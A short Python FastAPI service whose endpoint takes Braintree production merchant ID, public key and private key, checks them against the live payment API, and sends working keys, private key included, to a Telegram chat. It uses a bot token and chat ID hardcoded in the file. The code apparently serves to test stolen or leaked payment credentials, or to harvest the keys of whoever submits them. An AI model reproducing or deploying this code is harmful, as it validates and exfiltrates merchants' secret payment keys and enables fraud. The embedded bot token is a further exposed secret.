from fastapi import FastAPI, HTTPException, Query
import braintree
import requests

app = FastAPI()

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7804608536:AAH9RQ39fE37KpLp7_GJdJE_28j5YeM_Vug"
TELEGRAM_CHAT_ID = "-1002263522931"

def send_to_telegram(message: str) -> bool:
    """
    Send a message to the specified Telegram chat.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"Failed to send Telegram message: {e}")
        return False

def validate_braintree_keys(merchant_id: str, public_key: str, private_key: str) -> bool:
    """
    Validate Braintree production keys by making an API call.
    """
    try:
        gateway = braintree.BraintreeGateway(
            braintree.Configuration(
                environment=braintree.Environment.Production,
                merchant_id=merchant_id,
                public_key=public_key,
                private_key=private_key,
            )
        )
        # Perform a basic API call to validate the keys
        gateway.merchant_account.all()
        return True
    except braintree.exceptions.authentication_error.AuthenticationError:
        return False
    except Exception as e:
        raise Exception(f"Unexpected error: {e}")

@app.get("/check-braintree-keys/")
async def check_braintree_keys(
    merchant_id: str = Query(..., description="Braintree Merchant ID"),
    public_key: str = Query(..., description="Braintree Public Key"),
    private_key: str = Query(..., description="Braintree Private Key"),
):
    """
    Endpoint to check if Braintree keys are live and send Telegram notification if valid.
    """
    try:
        if validate_braintree_keys(merchant_id, public_key, private_key):
            message = (
                f"Braintree keys are live!\n\n"
                f"Merchant ID: {merchant_id}\n"
                f"Public Key: {public_key}\n"
                f"Private Key: {private_key}"
            )
            telegram_status = send_to_telegram(message)
            if telegram_status:
                return {"status": "success", "message": "Keys are live. Telegram notification sent."}
            else:
                return {"status": "success", "message": "Keys are live. Telegram notification failed."}
        else:
            raise HTTPException(status_code=401, detail="Invalid Braintree production keys.")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
